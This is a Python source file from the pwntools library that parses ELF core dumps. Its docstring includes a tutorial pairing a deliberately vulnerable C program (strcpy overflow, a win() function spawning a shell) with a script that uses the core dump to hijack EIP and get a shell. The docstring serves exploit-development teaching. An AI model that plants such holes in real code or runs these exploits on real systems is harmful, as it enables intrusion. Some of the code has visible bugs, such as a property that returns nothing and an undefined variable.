"""Read information from Core Dumps.

Core dumps are extremely useful when writing exploits, even outside of
the normal act of debugging things.

Using Corefiles to Automate Exploitation
----------------------------------------

For example, if you have a trivial buffer overflow and don't want to
open up a debugger or calculate offsets, you can use a generated core
dump to extract the relevant information.

.. code-block:: c

    #include <string.h>
    #include <stdlib.h>
    #include <unistd.h>
    void win() {
        system("sh");
    }
    int main(int argc, char** argv) {
        char buffer[64];
        strcpy(buffer, argv[1]);
    }

.. code-block:: shell

    $ gcc crash.c -m32 -o crash -fno-stack-protector

.. code-block:: python

    from pwn import *

    # Generate a cyclic pattern so that we can auto-find the offset
    payload = cyclic(128)

    # Run the process once so that it crashes
    process(['./crash', payload]).wait()

    # Get the core dump
    core = Coredump('./core')

    # Our cyclic pattern should have been used as the crashing address
    assert pack(core.eip) in payload

    # Cool! Now let's just replace that value with the address of 'win'
    crash = ELF('./crash')
    payload = fit({
        cyclic_find(core.eip): crash.symbols.win
    })

    # Get a shell!
    io = process(['./crash', payload])
    io.sendline('id')
    print io.recvline()
    # uid=1000(user) gid=1000(user) groups=1000(user)

Module Members
----------------------------------------

"""
from __future__ import absolute_import

import collections
import ctypes

import elftools
from elftools.common.py3compat import bytes2str
from elftools.common.utils import roundup
from elftools.common.utils import struct_parse
from elftools.construct import CString

from pwnlib.context import context
from pwnlib.elf.datatypes import *
from pwnlib.elf.elf import ELF
from pwnlib.log import getLogger
from pwnlib.tubes.tube import tube

log = getLogger(__name__)

types = {
    'i386': elf_prstatus_i386,
    'amd64': elf_prstatus_amd64,
}

# Slightly modified copy of the pyelftools version of the same function,
# until they fix this issue:
# https://github.com/eliben/pyelftools/issues/93
def iter_notes(self):
    """ Iterates the list of notes in the segment.
    """
    offset = self['p_offset']
    end = self['p_offset'] + self['p_filesz']
    while offset < end:
        note = struct_parse(
            self.elffile.structs.Elf_Nhdr,
            self.stream,
            stream_pos=offset)
        note['n_offset'] = offset
        offset += self.elffile.structs.Elf_Nhdr.sizeof()
        self.stream.seek(offset)
        # n_namesz is 4-byte aligned.
        disk_namesz = roundup(note['n_namesz'], 2)
        note['n_name'] = bytes2str(
            CString('').parse(self.stream.read(disk_namesz)))
        offset += disk_namesz

        desc_data = bytes2str(self.stream.read(note['n_descsz']))
        note['n_desc'] = desc_data
        offset += roundup(note['n_descsz'], 2)
        note['n_size'] = offset - note['n_offset']
        yield note

class Mapping(object):
    """Encapsulates information about a memory mapping in a :class:`Corefile`.
    """
    def __init__(self, core, name, start, stop, flags):
        self._core=core

        #: Name of the mapping, e.g. ``'/bin/bash'`` or ``'[vdso]'``.
        self.name=name

        #: First mapped byte in the mapping
        self.start=start

        #: First byte after the end of hte mapping
        self.stop=stop

        #: Size of the mapping, in bytes
        self.size=stop-start

        #: Mapping flags, using e.g. ``PROT_READ`` and so on.
        self.flags=flags

    @property
    def address(self):
        """:class:`int`: Alias for :data:`Mapping.start`."""

    @property
    def permstr(self):
        """:class:`str`: Human-readable memory permission string, e.g. ``r-xp``."""
        flags = self.flags
        return ''.join(['r' if flags & 4 else '-',
                        'w' if flags & 2 else '-',
                        'x' if flags & 1 else '-',
                        'p'])
    def __str__(self):
        return '%x-%x %s %x %s' % (self.start,self.stop,self.permstr,self.size,self.name)

    def __repr__(self):
        return '%s(%r, start=%#x, stop=%#x, size=%#x, flags=%#x)' \
            % (self.__class__.__name__,
               self.name,
               self.start,
               self.stop,
               self.size,
               self.flags)

    def __int__(self):
        return self.start

    @property
    def data(self):
        """:class:`str`: Memory of the mapping."""
        return self._core.read(self.start, self.size)

class Corefile(ELF):
    """Enhances the inforation available about a corefile (which is an extension
    of the ELF format) by permitting extraction of information about the mapped
    data segments, and register state.

    Registers can be accessed directly, e.g. via ``core_obj.eax`` and enumerated
    via :data:`Corefile.registers`.

    ::

        >>> c = Corefile('./core')
        >>> hex(c.eax)
        '0xfff5f2e0'
        >>> c.registers
        {'eax': 4294308576,
         'ebp': 1633771891,
         'ebx': 4151132160,
         'ecx': 4294311760,
         'edi': 0,
         'edx': 4294308700,
         'eflags': 66050,
         'eip': 1633771892,
         'esi': 0,
         'esp': 4294308656,
         'orig_eax': 4294967295,
         'xcs': 35,
         'xds': 43,
         'xes': 43,
         'xfs': 0,
         'xgs': 99,
         'xss': 43}

    Mappings can be iterated in order via :attr:`Corefile.mappings`.

    ::

        >>> Corefile('./core').mappings
        [Mapping('/home/user/pwntools/crash', start=0x8048000, stop=0x8049000, size=0x1000, flags=0x5),
         Mapping('/home/user/pwntools/crash', start=0x8049000, stop=0x804a000, size=0x1000, flags=0x4),
         Mapping('/home/user/pwntools/crash', start=0x804a000, stop=0x804b000, size=0x1000, flags=0x6),
         Mapping(None, start=0xf7528000, stop=0xf7529000, size=0x1000, flags=0x6),
         Mapping('/lib/i386-linux-gnu/libc-2.19.so', start=0xf7529000, stop=0xf76d1000, size=0x1a8000, flags=0x5),
         Mapping('/lib/i386-linux-gnu/libc-2.19.so', start=0xf76d1000, stop=0xf76d2000, size=0x1000, flags=0x0),
         Mapping('/lib/i386-linux-gnu/libc-2.19.so', start=0xf76d2000, stop=0xf76d4000, size=0x2000, flags=0x4),
         Mapping('/lib/i386-linux-gnu/libc-2.19.so', start=0xf76d4000, stop=0xf76d5000, size=0x1000, flags=0x6),
         Mapping(None, start=0xf76d5000, stop=0xf76d8000, size=0x3000, flags=0x6),
         Mapping(None, start=0xf76ef000, stop=0xf76f1000, size=0x2000, flags=0x6),
         Mapping('[vdso]', start=0xf76f1000, stop=0xf76f2000, size=0x1000, flags=0x5),
         Mapping('/lib/i386-linux-gnu/ld-2.19.so', start=0xf76f2000, stop=0xf7712000, size=0x20000, flags=0x5),
         Mapping('/lib/i386-linux-gnu/ld-2.19.so', start=0xf7712000, stop=0xf7713000, size=0x1000, flags=0x4),
         Mapping('/lib/i386-linux-gnu/ld-2.19.so', start=0xf7713000, stop=0xf7714000, size=0x1000, flags=0x6),
         Mapping('[stack]', start=0xfff3e000, stop=0xfff61000, size=0x23000, flags=0x6)]

    """
    def __init__(self, *a, **kw):
        #: The NT_PRSTATUS object.
        self.prstatus = None

        #: :class:`dict`: Dictionary of memory mappings from ``address`` to ``name``
        self.mappings = []

        #: :class:`int`: Address of the stack base
        self.stack    = None

        #: :class:`dict`: Environment variables read from the stack.  Keys are
        #: the environment variable name, values are the memory address of the
        #: variable.
        #:
        #: Note: Use with the :meth:`.ELF.string` method to extract them.
        self.env      = {}

        try:
            super(Core, self).__init__(*a, **kw)
        except IOError:
            log.warning("No corefile.  Have you set /proc/sys/kernel/core_pattern?")
            raise

        self.load_addr = 0
        self._address  = 0

        if not self.elftype == 'CORE':
            log.error("%s is not a valid corefile" % e.file.name)

        if not self.arch in ('i386','amd64'):
            log.error("%s does not use a supported corefile architecture" % e.file.name)

        prstatus_type = types[self.arch]

        with log.waitfor("Parsing corefile...") as w:
            self._load_mappings()

            for segment in self.segments:
                if not isinstance(segment, elftools.elf.segments.NoteSegment):
                    continue
                for note in iter_notes(segment):
                    # Try to find NT_PRSTATUS.  Note that pyelftools currently
                    # mis-identifies the enum name as 'NT_GNU_ABI_TAG'.
                    if note.n_descsz == ctypes.sizeof(prstatus_type) and \
                       note.n_type == 'NT_GNU_ABI_TAG':
                        self.NT_PRSTATUS = note
                        self.prstatus = prstatus_type.from_buffer_copy(note.n_desc)

                    # Try to find the list of mapped files
                    if note.n_type == constants.NT_FILE:
                        with context.local(bytes=self.bytes):
                            self._parse_nt_file(note)

                    # Try to find the auxiliary vector, which will tell us
                    # where the top of the stack is.
                    if note.n_type == constants.NT_AUXV:
                        with context.local(bytes=self.bytes):
                            self._parse_auxv(note)

            if self.stack and self.mappings:
                for mapping in self.mappings:
                    if mapping.stop == self.stack:
                        mapping.name = '[stack]'
                        self.stack   = mapping

            with context.local(bytes=self.bytes, log_level='error'):
                try:
                    self._parse_stack()
                except ValueError:
                    # If there are no environment variables, we die by running
                    # off the end of the stack.
                    pass

    def _parse_nt_file(self, note):
        t = tube()
        t.unrecv(note.n_desc)

        count = t.unpack()
        page_size = t.unpack()

        starts = []
        addresses = {}

        for i in range(count):
            start = t.unpack()
            end = t.unpack()
            ofs = t.unpack()
            starts.append(start)

        for i in range(count):
            filename = t.recvuntil('\x00', drop=True)
            start = starts[i]

            for mapping in self.mappings:
                if mapping.start == start:
                    mapping.name = filename

        self.mappings = sorted(self.mappings, key=lambda m: m.start)

        vvar = vdso = vsyscall = False
        for mapping in reversed(self.mappings):
            if mapping.name:
                continue

            if not vsyscall and mapping.start == 0xffffffffff600000:
                mapping.name = '[vsyscall]'
                vsyscall = True
                continue

            if mapping.start == self.at_sysinfo_ehdr \
            or (not vdso and mapping.size in [0x1000, 0x2000] \
                and mapping.flags == 5 \
                and self.read(mapping.start, 4) == '\x7fELF'):
                mapping.name = '[vdso]'
                vdso = True
                continue

            if not vvar and mapping.size == 0x2000 and mapping.flags == 4:
                mapping.name = '[vvar]'
                vvar = True
                continue

    @property
    def vvar(self):
        """:class:`Mapping`: Mapping for the vvar section"""
        for m in self.mappings:
            if m.name == '[vvar]':
                return m

    @property
    def vdso(self):
        """:class:`Mapping`: Mapping for the vdso section"""
        for m in self.mappings:
            if m.name == '[vdso]':
                return m

    @property
    def vsyscall(self):
        """:class:`Mapping`: Mapping for the vsyscall section"""
        for m in self.mappings:
            if m.name == '[vsyscall]':
                return m

    @property
    def libc(self):
        """:class:`Mapping`: First mapping for ``libc.so``"""
        for m in self.mappings:
            if m.name and m.name.startswith('libc') and m.name.endswith('.so'):
                return m

    @property
    def exe(self):
        """:class:`Mapping`: First mapping for the executable file."""
        for m in self.mappings:
            if self.at_entry and m.start <= self.at_entry <= m.stop:
                return m

    def _load_mappings(self):
        for s in self.segments:
            if s.header.p_type != 'PT_LOAD':
                continue

            mapping = Mapping(self,
                              None,
                              s.header.p_vaddr,
                              s.header.p_vaddr + s.header.p_memsz,
                              s.header.p_flags)
            self.mappings.append(mapping)

    def _parse_auxv(self, note):
        t = tube()
        t.unrecv(note.n_desc)

        for i in range(0, note.n_descsz, context.bytes * 2):
            key = t.unpack()
            value = t.unpack()

            # The AT_EXECFN entry is a pointer to the executable's filename
            # at the very top of the stack, followed by a word's with of
            # NULL bytes.  For example, on a 64-bit system...
            #
            # 0x7fffffffefe8  53 3d 31 34  33 00 2f 62  69 6e 2f 62  61 73 68 00  |S=14|3./b|in/b|ash.|
            # 0x7fffffffeff8  00 00 00 00  00 00 00 00                            |....|....|    |    |

            if key == constants.AT_EXECFN:
                self.at_execfn = value
                value = value & ~0xfff
                value += 0x1000
                self.stack = value

            if key == constants.AT_ENTRY:
                self.at_entry = value

            if key == constants.AT_PHDR:
                self.at_phdr = value

            if key == constants.AT_BASE:
                self.at_base = value

            if key == constants.AT_SYSINFO_EHDR:
                self.at_sysinfo_ehdr = value

    def _parse_stack(self):
        # AT_EXECFN is the start of the filename, e.g. '/bin/sh'
        # Immediately preceding is a NULL-terminated environment variable string.
        # We want to find the beginning of it
        address = self.at_execfn-1

        # Sanity check!
        try:
            assert self.u8(address) == 0
        except AssertionError:
            # Something weird is happening.  Just don't touch it.
            return
        except ValueError:
            # If the stack is not actually present in the coredump, we can't
            # read from the stack.  This will fail as:
            # ValueError: 'seek out of range'
            return

        # Find the next NULL, which is 1 byte past the environment variable.
        while self.u8(address-1) != 0:
            address -= 1

        # We've found the beginning of the last environment variable.
        # We should be able to search up the stack for the envp[] array to
        # find a pointer to this address, followed by a NULL.
        last_env_addr = address
        address &= ~(context.bytes-1)

        while self.unpack(address) != last_env_addr:
            address -= context.bytes

        assert self.unpack(address+context.bytes) == 0

        # We've successfully located the end of the envp[] array.
        # It comes immediately after the argv[] array, which itself
        # is NULL-terminated.
        end_of_envp = address+context.bytes

        while self.unpack(address - context.bytes) != 0:
            address -= context.bytes

        start_of_envp = address

        # Now we can fill in the environment easier.
        for env in range(start_of_envp, end_of_envp, context.bytes):
            envaddr = self.unpack(env)
            value   = self.string(envaddr)
            name, value = value.split('=', 1)
            self.env[name] = envaddr + len(name) + 1

    @property
    def maps(self):
        """:class:`str`: A printable string which is similar to /proc/xx/maps.

        ::

            >>> print Corefile('./core').maps
            8048000-8049000 r-xp 1000 /home/user/pwntools/crash
            8049000-804a000 r--p 1000 /home/user/pwntools/crash
            804a000-804b000 rw-p 1000 /home/user/pwntools/crash
            f7528000-f7529000 rw-p 1000 None
            f7529000-f76d1000 r-xp 1a8000 /lib/i386-linux-gnu/libc-2.19.so
            f76d1000-f76d2000 ---p 1000 /lib/i386-linux-gnu/libc-2.19.so
            f76d2000-f76d4000 r--p 2000 /lib/i386-linux-gnu/libc-2.19.so
            f76d4000-f76d5000 rw-p 1000 /lib/i386-linux-gnu/libc-2.19.so
            f76d5000-f76d8000 rw-p 3000 None
            f76ef000-f76f1000 rw-p 2000 None
            f76f1000-f76f2000 r-xp 1000 [vdso]
            f76f2000-f7712000 r-xp 20000 /lib/i386-linux-gnu/ld-2.19.so
            f7712000-f7713000 r--p 1000 /lib/i386-linux-gnu/ld-2.19.so
            f7713000-f7714000 rw-p 1000 /lib/i386-linux-gnu/ld-2.19.so
            fff3e000-fff61000 rw-p 23000 [stack]
        """
        return '\n'.join(map(str, self.mappings))

    def getenv(self, name):
        """getenv(name) -> int

        Read an environment variable off the stack, and return its contents.

        Arguments:
            name(str): Name of the environment variable to read.

        Returns:
            :class:`str`: The contents of the environment variable.
        """
        if name not in self.env:
            log.error("Environment variable %r not set" % name)

        return self.string(self.env[name]).split('=',1)[-1]

    @property
    def registers(self):
        """:class:`dict`: All available registers in the coredump."""
        rv = {}

        for k in dir(self.prstatus.pr_reg):
            if k.startswith('_'):
                continue

            try:
                rv[k] = int(getattr(self.prstatus.pr_reg, k))
            except Exception:
                pass

        return rv

    def __getattr__(self, attribute):
        if self.prstatus:
            if hasattr(self.prstatus, attribute):
                return getattr(self.prstatus, attribute)

            if hasattr(self.prstatus.pr_reg, attribute):
                return getattr(self.prstatus.pr_reg, attribute)

        return super(Core, self).__getattribute__(attribute)

Core = Corefile
